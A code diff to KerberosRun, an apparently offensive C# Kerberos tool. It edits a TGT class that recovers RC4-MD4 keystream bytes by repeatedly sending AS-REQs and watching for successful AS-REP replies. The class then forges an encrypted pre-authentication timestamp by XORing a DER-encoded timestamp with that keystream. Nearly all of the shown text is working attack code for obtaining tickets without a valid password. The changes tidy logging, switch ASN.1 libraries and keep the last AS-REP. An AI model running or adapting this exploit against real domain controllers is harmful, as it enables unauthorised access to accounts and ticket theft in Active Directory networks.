@@ -21,6 +21,7 @@ using System.IO;
 using System.Formats.Asn1;
 using System.Security.Cryptography.Asn1;
 using Kerberos.NET.Asn1;
+using Asn1;
 
 namespace KerberosRun
 {
@@ -41,6 +42,7 @@ namespace KerberosRun
 
         private const int BASE_OFFSET = 0x18;
         private const int KEY_OFFSET = BASE_OFFSET + 0x15;
+        internal KrbAsRep LastAsRep;
 
         public TGT() : base()
         {
@@ -224,24 +226,25 @@ namespace KerberosRun
 
                     var result = SendAsync(asReq).Result;
 
-                    if (!(result is KrbAsRep))
+                    if (result is KrbAsRep asRepSucceed)
                     {
-                        continue;
+                        logger.Info("[!] Found key byte {0}.", j);
+                        foundKey = true;
+                        LastAsRep = asRepSucceed;
+                        break;
                     }
-                    logger.Info("[!] Found key byte {0}.", j);
-                    foundKey = true;
-                    break;
+                    else{ continue; }
                 }
 
                 if (!foundKey)
                 {
-                    logger.Equals("[x] Couldn't find next key stream byte.");
+                    logger.Error("[x] Couldn't find next key stream byte.");
                 }
             }
 
             if (keyStream.Length < (KEY_OFFSET + 5))
             {
-                throw new ArgumentException("Couldn't get enough key data.");
+                logger.Error("[x] Couldn't get enough key data.");
             }
 
             byte[] key = new byte[16];
@@ -261,59 +264,31 @@ namespace KerberosRun
         }
 
 
-        public byte[] Test()
-        {
-            var writer = new AsnWriter(AsnEncodingRules.DER);
-
-            var tag = Asn1Tag.Sequence;
-
-            writer.PushSequence(tag);
-
-            writer.PushSequence(new Asn1Tag(TagClass.ContextSpecific, 0));
-            writer.WriteGeneralizedTime(new DateTimeOffset(DateTime.UtcNow, TimeSpan.Zero));
-            writer.PopSequence(new Asn1Tag(TagClass.ContextSpecific, 0));
-            return writer.Encode();
-        }
 
         public byte[] BuildRC4MD4Timestamp(int prefixLength, bool addNullChar, byte[] keyStream)
         {
-            var ts = new KrbPaEncTsEnc()
-            {
-                PaTimestamp = new DateTimeOffset(DateTime.UtcNow, TimeSpan.Zero),
-            };
+            string patimestamp = DateTime.UtcNow.ToString("yyyyMMddHHmmssZ");
 
-            
-            var derArray = Test();
-
-
-            Console.WriteLine(ts.PaTimestamp.ToString("yyyyMMddHHmmssZ"));
-            Console.WriteLine(prefixLength);
-
-
-            //var derArray = ts.Encode().ToArray();
-            var rawderArray = new ArraySegment<byte>(derArray, 2, derArray.Length - 2).ToArray();
             if (addNullChar)
-            {
-                Array.Resize<byte>(ref rawderArray, rawderArray.Length + 1);
-                rawderArray[rawderArray.Length - 1] = 0;
-            }
+                patimestamp += "\0";
 
-            Console.WriteLine(BitConverter.ToString(rawderArray.ToArray()));
-            Console.ReadLine();
+            AsnElt patimestampAsn = AsnElt.MakeString(AsnElt.GeneralizedTime, patimestamp);
+            AsnElt patimestampSeq = AsnElt.Make(AsnElt.SEQUENCE, new[] { patimestampAsn });
+            patimestampSeq = AsnElt.MakeImplicit(AsnElt.CONTEXT, 0, patimestampSeq);
+            byte[] derArray = patimestampSeq.Encode();
+
+
             MemoryStream stm = new MemoryStream();
             stm.Write(new byte[0x18], 0, 0x18);
             stm.WriteByte(0x30);
 
-            byte[] ls = Utils.EncodeLength(rawderArray.Length, prefixLength);
+            byte[] ls = Utils.EncodeLength(derArray.Length, prefixLength);
 
             stm.Write(ls, 0, ls.Length);
-            stm.Write(rawderArray, 0, rawderArray.Length);
+            stm.Write(derArray, 0, derArray.Length);
+            var asReqTSCipher = stm.ToArray();
 
-
-            var asReqCipher = stm.ToArray();
-
-
-            if (asReqCipher.Length > keyStream.Length)
+            if (asReqTSCipher.Length > keyStream.Length)
             {
                 logger.Error("[x] Not enough keystream to encode timestamp.");
                 Environment.Exit(1);
@@ -322,13 +297,12 @@ namespace KerberosRun
             for (int i = 0; i < keyStream.Length; ++i)
             {
                 byte k = keyStream[i];
-                if (i >= asReqCipher.Length)
+                if (i >= asReqTSCipher.Length)
                     break;
-                asReqCipher[i] ^= k;
+                asReqTSCipher[i] ^= k;
             }
-            Console.WriteLine(BitConverter.ToString(asReqCipher.ToArray()));
-            Console.WriteLine("______________________________");
-            return asReqCipher;
+
+            return asReqTSCipher;
         }
 
 
